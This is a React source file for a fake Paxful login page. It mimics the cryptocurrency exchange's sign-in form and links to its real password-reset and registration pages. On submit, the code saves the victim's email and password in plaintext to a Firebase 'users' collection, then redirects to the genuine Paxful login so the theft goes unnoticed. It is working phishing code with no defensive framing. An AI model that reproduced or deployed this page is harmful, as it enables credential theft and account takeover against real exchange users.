
import { useState } from "react";
import "../App.css";
import { collection,addDoc } from "firebase/firestore";
import {db} from './config/firebase'
import { Input } from "../components/ui/input";
import { Button } from "./ui/button";
function App() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
const AddData = async(formData)=>{
  try {
    const docRef = await addDoc(collection(db, "users"), {
      email: formData.email,
      password: formData.password,
    });
    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };
  const handleSubmit = async (e) => {
    e.preventDefault();
    await AddData(formData);
    window.location.href = 'https://accounts.paxful.com/login/';

  };

  return (
    <div className=" mt-10">
      <div className="login-box w-[22rem] lg:w-full">
        <form
          className="login-form"
          onSubmit={(e) => handleSubmit(e)}
        >
          <div className="form-group">
            <label htmlFor="email">Your Phone or Email</label>
            <Input
              type="email"
              id="email"
              name="email"
              required
              value={formData.email}
              onChange={handleChange}
            />
          </div>
          <div className="form-group py-4 relative">
            <label htmlFor="password">Your Password</label>
            <h2 className="absolute right-0 top-4 text-sm text-blue-800"><a href="https://paxful.com/forgot-password?locale=en">Forgot password?</a></h2>
            <Input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              required
            />
          </div>
          <Button type="submit" className="w-full flex justify-start text-white font-semibold relative">
            Log in <svg width="30" height="30" viewBox="0 0 15 15" className="absolute right-4" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.18194 4.18185C6.35767 4.00611 6.6426 4.00611 6.81833 4.18185L9.81833 7.18185C9.90272 7.26624 9.95013 7.3807 9.95013 7.50005C9.95013 7.6194 9.90272 7.73386 9.81833 7.81825L6.81833 10.8182C6.6426 10.994 6.35767 10.994 6.18194 10.8182C6.0062 10.6425 6.0062 10.3576 6.18194 10.1819L8.86374 7.50005L6.18194 4.81825C6.0062 4.64251 6.0062 4.35759 6.18194 4.18185Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
          </Button>
        </form>
        <p id="error" className="error-message"></p>
        <hr className="mt-6 border border-solid border-gray-200"/>
        <p className="text-sm pt-4">
          New on Paxful? <a className="text-blue-500" href="https://paxful.com/register?locale=en">Create an Account</a>
        </p>
      </div>
    </div>
  );
}

export default App;
